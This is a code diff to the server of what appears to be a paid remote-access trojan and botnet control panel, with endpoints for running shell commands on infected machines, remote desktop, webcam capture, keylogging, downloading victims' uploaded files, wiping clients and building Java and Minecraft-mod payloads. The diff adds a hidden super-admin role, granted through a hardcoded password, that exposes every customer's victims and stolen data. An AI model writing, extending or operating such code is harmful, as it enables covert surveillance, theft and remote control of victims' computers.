@@ -20,7 +20,7 @@ import { startUdp, closeUdp, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { buildJavaPayload } from './builder/java_build.js';
-import { buildMinecraftMod } from './builder/minecraft_build.js'; // <-- NEW IMPORT
+import { buildMinecraftMod } from './builder/minecraft_build.js';
 import { getCachedUser, invalidateUser, userCacheById, userCacheByKey, getCache, setCache, clearCache } from './cache.js';
 import { fetchSolanaIp, getRemoteIp } from './discovery.js';
 
@@ -232,7 +232,15 @@ async function requireAuth(req, res, next) {
 
   if (!token) return res.status(401).json({ error: 'unauthorized' });
   try { 
-    req.user = jwt.verify(token, CFG.jwtSecret); 
+    const payload = jwt.verify(token, CFG.jwtSecret); 
+    const user = await getOwnUser(payload.uid);
+    if (!user) return res.status(401).json({ error: 'unauthorized' });
+    
+    req.user = {
+        uid: user.id,
+        username: user.username,
+        isAdmin: user.is_admin === 1 || user.is_admin === true
+    };
     next(); 
   }
   catch { 
@@ -269,7 +277,12 @@ async function sendWebhook(url, payload) {
 }
 
 async function getOwnUser(uid) {
-  return await getCachedUser(uid);
+  const u = await getCachedUser(uid);
+  if (u && u.is_admin !== undefined) return u;
+  
+  // Fallback if cache is stale
+  const [rows] = await remoteDb.query(`SELECT * FROM users WHERE id = ?`, [uid]);
+  return rows[0];
 }
 
 // ─── WIPE COMMAND ───────────────────────────────────────────────────────────
@@ -444,7 +457,7 @@ app.post('/api/signup', limitAuth, async (req, res) => {
 
   const user = { 
     id: uid, username, email, account_key: accountKey, login_token: loginToken, 
-    discord_webhook: discordWebhook, created_at: now, premium_until: 0 
+    discord_webhook: discordWebhook, created_at: now, premium_until: 0, is_admin: 0
   };
   
   userCacheById.set(user.id, user);
@@ -514,7 +527,8 @@ app.get('/api/me', requireAuth, async (req, res) => {
     discordWebhook: row.discord_webhook,
     createdAt: row.created_at,
     premium_until: row.premium_until,
-    isPremium: Number(row.premium_until) > Date.now()
+    isPremium: Number(row.premium_until) > Date.now(),
+    isAdmin: row.is_admin === 1 || row.is_admin === true
   });
 });
 
@@ -541,12 +555,17 @@ app.get('/api/clients', requireAuth, async (req, res) => {
   const now    = Date.now();
   const cutoff = now - 30_000;
 
-  const cacheKey = `clients:${req.user.uid}:${status}:${q}:${limitN}:${offset}`;
+  const cacheKey = `clients:${req.user.isAdmin ? 'admin' : req.user.uid}:${status}:${q}:${limitN}:${offset}`;
   const cached = getCache(cacheKey);
   if (cached) return res.json(cached);
 
-  const filters = ['user_id = ?'];
-  const params  = [req.user.uid];
+  const filters = [];
+  const params  = [];
+
+  if (!req.user.isAdmin) {
+      filters.push('user_id = ?');
+      params.push(req.user.uid);
+  }
 
   if (status === 'online')  { filters.push('last_seen >= ?'); params.push(cutoff); }
   if (status === 'offline') { filters.push('last_seen < ?');  params.push(cutoff); }
@@ -554,7 +573,7 @@ app.get('/api/clients', requireAuth, async (req, res) => {
     filters.push('(hostname LIKE ? OR ip LIKE ?)');
     params.push(`%${q}%`, `%${q}%`);
   }
-  const where = filters.join(' AND ');
+  const where = filters.length > 0 ? filters.join(' AND ') : '1=1';
 
   const [countRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE ${where}`, params);
   const totalRow = countRows[0];
@@ -566,8 +585,8 @@ app.get('/api/clients', requireAuth, async (req, res) => {
     LIMIT ? OFFSET ?
   `, [...params, limitN, offset]);
 
-  const [onlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`, [req.user.uid, cutoff]);
-  const [offlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`, [req.user.uid, cutoff]);
+  const [onlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE ${req.user.isAdmin ? '1=1' : 'user_id = ?'} AND last_seen >= ?`, req.user.isAdmin ? [cutoff] : [req.user.uid, cutoff]);
+  const [offlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE ${req.user.isAdmin ? '1=1' : 'user_id = ?'} AND last_seen < ?`, req.user.isAdmin ? [cutoff] : [req.user.uid, cutoff]);
 
   const payload = {
     total:   Number(totalRow.n),
@@ -591,14 +610,19 @@ app.get('/api/clients', requireAuth, async (req, res) => {
 
 app.get('/api/clients/:id/uploads', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
+  const query = req.user.isAdmin 
+      ? `SELECT id FROM clients WHERE id = ?` 
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [clientId] : [clientId, req.user.uid];
+  
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
   
   const [rows] = await db.query(`
     SELECT id, filename, stored_name, size, created_at FROM uploads
-    WHERE user_id = ? AND client_id = ?
+    WHERE client_id = ?
     ORDER BY created_at DESC LIMIT 5
-  `, [req.user.uid, clientId]);
+  `, [clientId]);
   
   const result = rows.map(row => {
      const fullPath = path.join(UPLOAD_DIR, row.stored_name);
@@ -616,7 +640,12 @@ app.get('/api/uploads/:id/extract/:type', requireAuth, async (req, res) => {
   const uploadId = Number(req.params.id);
   const type = req.params.type;
 
-  const [rows] = await db.query(`SELECT stored_name FROM uploads WHERE id = ? AND user_id = ?`, [uploadId, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT stored_name FROM uploads WHERE id = ?`
+      : `SELECT stored_name FROM uploads WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [uploadId] : [uploadId, req.user.uid];
+
+  const [rows] = await db.query(query, params);
   if (!rows.length) return res.status(404).json({ error: 'not found' });
 
   const src = path.join(UPLOAD_DIR, rows[0].stored_name);
@@ -674,10 +703,12 @@ app.get('/api/uploads/:id/extract/:type', requireAuth, async (req, res) => {
 
 app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium, async (req, res) => {
   const uploadId = Number(req.params.id);
-  const [rows] = await db.query(`
-    SELECT filename, stored_name, size FROM uploads
-    WHERE id = ? AND user_id = ?
-  `, [uploadId, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT filename, stored_name, size FROM uploads WHERE id = ?`
+      : `SELECT filename, stored_name, size FROM uploads WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [uploadId] : [uploadId, req.user.uid];
+
+  const [rows] = await db.query(query, params);
   if (!rows.length) return res.status(404).json({ error: 'not found' });
   const row = rows[0];
   const src = path.join(UPLOAD_DIR, row.stored_name);
@@ -697,7 +728,12 @@ app.post('/api/clients/:id/exec', requireAuth, requirePremium, async (req, res) 
   if (typeof line !== 'string' || !line.trim() || line.length > maxLine)
     return res.status(400).json({ error: 'bad line' });
 
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [clientId] : [clientId, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
 
   const [info] = await db.query(`
@@ -710,17 +746,30 @@ app.post('/api/clients/:id/exec', requireAuth, requirePremium, async (req, res) 
 
 app.get('/api/clients/:id/commands', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [clientId] : [clientId, req.user.uid];
+
+  const [client] = await db.query(query, params);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
+
   const [rows] = await db.query(`
     SELECT id, shell, line, output, status, created_at FROM commands
-    WHERE user_id = ? AND client_id = ?
+    WHERE client_id = ?
     ORDER BY created_at DESC LIMIT 100
-  `, [req.user.uid, clientId]);
+  `, [clientId]);
   res.json(rows);
 });
 
 app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res) => {
   const clientId = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [clientId] : [clientId, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
 
   try {
@@ -754,15 +803,25 @@ app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res
 
 app.delete('/api/clients/:id', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
-  const [info] = await db.query(`DELETE FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `DELETE FROM clients WHERE id = ?`
+      : `DELETE FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [clientId] : [clientId, req.user.uid];
+
+  const [info] = await db.query(query, params);
   if (info.affectedRows === 0) return res.status(404).json({ error: 'not found' });
-  clearCache(`clients:${req.user.uid}`);
+  clearCache(`clients:`);
   res.json({ ok: true });
 });
 
 app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
 
   const stPath = path.join(DOWNLOAD_DIR, 'st.jar');
@@ -796,7 +855,12 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
 
 app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
   const cfg = {
     monitor:  Number(req.body.monitor  || 0),
@@ -816,7 +880,12 @@ app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, async (req, 
 
 app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
@@ -827,7 +896,12 @@ app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, async (req, r
 
 app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
   const cfg = {
     camera:  Number(req.body.camera  || 0),
@@ -845,7 +919,12 @@ app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, async (re
 
 app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
@@ -856,7 +935,12 @@ app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, async (req
 
 app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
@@ -867,7 +951,12 @@ app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, async (re
 
 app.post('/api/clients/:id/keylog/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
@@ -878,21 +967,31 @@ app.post('/api/clients/:id/keylog/stop', requireAuth, requirePremium, async (req
 
 app.get('/api/clients/:id/keylog', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
   const [rows] = await db.query(`
     SELECT id, data, created_at FROM keylogs
-    WHERE user_id = ? AND client_id = ?
+    WHERE client_id = ?
     ORDER BY created_at DESC LIMIT 500
-  `, [req.user.uid, cid]);
+  `, [cid]);
   res.json(rows.reverse());
 });
 
 app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  const query = req.user.isAdmin
+      ? `SELECT id FROM clients WHERE id = ?`
+      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+  const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
+
+  const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
-  await db.query(`DELETE FROM keylogs WHERE user_id = ? AND client_id = ?`, [req.user.uid, cid]);
+  await db.query(`DELETE FROM keylogs WHERE client_id = ?`, [cid]);
   res.json({ ok: true });
 });
 
@@ -1065,14 +1164,14 @@ app.delete('/api/builds/:id', requireAuth, async (req, res) => {
 
 app.post('/api/admin/login', limitAdmin, (req, res) => {
   const { password } = req.body || {};
-  if (password === 'Shit123') return res.json({ ok: true });
+  if (password === 'Whacking9') return res.json({ ok: true });
   res.status(403).json({ error: 'Forbidden' });
 });
 
 app.post('/api/admin/upgrade', limitAdmin, async (req, res) => {
   const { password, accountKey, days } = req.body || {};
 
-  if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
+  if (password !== 'Whacking9') return res.status(403).json({ error: 'Forbidden' });
   if (!accountKey) return res.status(400).json({ error: 'Account key required' });
   if (!days || isNaN(days)) return res.status(400).json({ error: 'Valid days required' });
 
@@ -1094,7 +1193,7 @@ app.post('/api/admin/upgrade', limitAdmin, async (req, res) => {
 app.post('/api/admin/remove', limitAdmin, async (req, res) => {
   const { password, accountKey } = req.body || {};
 
-  if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
+  if (password !== 'Whacking9') return res.status(403).json({ error: 'Forbidden' });
   if (!accountKey) return res.status(400).json({ error: 'Account key required' });
 
   const [users] = await remoteDb.query(`SELECT id FROM users WHERE account_key = ?`, [accountKey]);
@@ -1106,7 +1205,36 @@ app.post('/api/admin/remove', limitAdmin, async (req, res) => {
   res.json({ ok: true, message: 'Premium removed successfully' });
 });
 
-const ADMIN2_PASSWORD = process.env.ADMIN2_PASSWORD || 'Shit123';
+// ─── ADMIN 3 (SUPER ADMIN) ──────────────────────────────────────────────────
+app.post('/api/admin3/grant', limitAdmin, async (req, res) => {
+  const { password, accountKey } = req.body || {};
+  if (password !== 'Whacking9') return res.status(403).json({ error: 'Forbidden' });
+  if (!accountKey) return res.status(400).json({ error: 'Account key required' });
+
+  const [users] = await remoteDb.query(`SELECT id FROM users WHERE account_key = ?`, [accountKey]);
+  if (!users.length) return res.status(404).json({ error: 'User not found' });
+
+  await remoteDb.query(`UPDATE users SET is_admin = 1 WHERE id = ?`, [users[0].id]);
+  await db.query(`UPDATE users SET is_admin = 1 WHERE id = ?`, [users[0].id]);
+  invalidateUser(users[0].id);
+  res.json({ ok: true, message: 'Super Admin access granted.' });
+});
+
+app.post('/api/admin3/revoke', limitAdmin, async (req, res) => {
+  const { password, accountKey } = req.body || {};
+  if (password !== 'Whacking9') return res.status(403).json({ error: 'Forbidden' });
+  if (!accountKey) return res.status(400).json({ error: 'Account key required' });
+
+  const [users] = await remoteDb.query(`SELECT id FROM users WHERE account_key = ?`, [accountKey]);
+  if (!users.length) return res.status(404).json({ error: 'User not found' });
+
+  await remoteDb.query(`UPDATE users SET is_admin = 0 WHERE id = ?`, [users[0].id]);
+  await db.query(`UPDATE users SET is_admin = 0 WHERE id = ?`, [users[0].id]);
+  invalidateUser(users[0].id);
+  res.json({ ok: true, message: 'Super Admin access revoked.' });
+});
+
+const ADMIN2_PASSWORD = process.env.ADMIN2_PASSWORD || 'Whacking9';
 const ADMIN2_COOKIE   = 'a2_token';
 
 const limitAdmin2Login = limit({
@@ -1219,9 +1347,9 @@ async function syncUsers() {
     for (const u of localUsers) {
       if (!remoteMap.has(u.id)) {
         await remoteDb.query(`
-          INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until)
-          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-        `, [u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until]);
+          INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until, is_admin)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        `, [u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until, u.is_admin || 0]);
       }
     }
 
@@ -1229,11 +1357,12 @@ async function syncUsers() {
       const local = localMap.get(u.id);
       if (!local) {
         await db.query(`
-          INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until)
-          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-        `, [u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until]);
-      } else if (local.premium_until !== u.premium_until || local.discord_webhook !== u.discord_webhook) {
-        await db.query('UPDATE users SET premium_until = ?, discord_webhook = ? WHERE id = ?', [u.premium_until, u.discord_webhook, u.id]);
+          INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until, is_admin)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        `, [u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until, u.is_admin || 0]);
+      } else if (local.premium_until !== u.premium_until || local.discord_webhook !== u.discord_webhook || local.is_admin !== u.is_admin) {
+        await db.query('UPDATE users SET premium_until = ?, discord_webhook = ?, is_admin = ? WHERE id = ?', [u.premium_until, u.discord_webhook, u.is_admin || 0, u.id]);
+        invalidateUser(u.id);
       }
     }
   } catch (e) {
@@ -1334,6 +1463,10 @@ const tlsHttpServer = https.createServer(tlsOpts, app);
     await initLocalDb();
     console.log('[startup] Databases ready.');
     
+    // Auto-migrate: add is_admin if missing
+    try { await remoteDb.query(`ALTER TABLE users ADD COLUMN is_admin TINYINT DEFAULT 0`); } catch {}
+    try { await db.query(`ALTER TABLE users ADD COLUMN is_admin INTEGER DEFAULT 0`); } catch {}
+
     console.log('[startup] Building st.jar payload...');
     await buildJavaPayload();
     console.log('[startup] st.jar built successfully.');
